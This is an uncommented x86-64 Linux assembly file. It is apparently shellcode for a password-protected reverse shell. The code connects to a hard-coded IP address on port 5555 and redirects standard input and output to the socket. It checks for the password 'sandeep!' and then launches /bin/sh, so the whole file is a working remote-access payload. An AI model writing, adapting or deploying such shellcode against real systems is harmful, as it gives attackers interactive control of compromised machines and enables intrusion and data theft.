section .text

global _start

_start:
	push 42
	pop rax
	dec rax
	push 2
	pop rdi
	push 1
	pop rsi
	sub rdx,rdx
	syscall

	push rax
	pop rdi

	push rdx
	mov dword[rsp-4],0xd4f64064
	mov word[rsp-6],0xb315
	mov word[rsp-8],0x2
	sub rsp,8
	push rsp
	pop rsi
	push 16
	pop rdx
	push 42
	pop rax
	syscall

	push 2
	pop rsi

dup:
	push 34
	pop rax
	dec rax
	syscall
	dec rsi
	jns dup

	xor rax,rax
	sub rsp,8
	mov rsi,rsp	
	push 8
	pop rdx
	syscall

	push rdi

	mov rax,0x21706565646e6173
	mov rdi,rsi
	scasq
	jnz exit

	xor rsi,rsi
	push rsi
	mov rdi,0x68732f6e69622f2f	
	push rdi
	push rsp
	pop rdi
	
	push rsi	
	push rdi
	lea rsi,[rsp]

	xor rdx,rdx
	push 60
	pop rax
	dec rax
	syscall	
	
exit:
	pop rdi
	push 3
	pop rax
	syscall
	
	push 60
	pop rax
	xor rdi,rdi
	syscall	
